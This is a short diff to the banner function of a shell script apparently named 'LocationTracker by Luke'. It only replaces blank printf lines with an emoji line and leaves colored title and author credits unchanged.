@@ -2,11 +2,7 @@ trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf '\n      \n' 
-printf '        \n'
-printf '       \n'
-printf '       \n'
-printf '         \n\n'
+printf '\n🖕🖕\n'
 printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
 printf " \e[1;93m      LocationTracker by Luke\e[0m \n"
 printf " \e[1;92m      lukemark.info | ig- lukespace6969 e[0m \n"
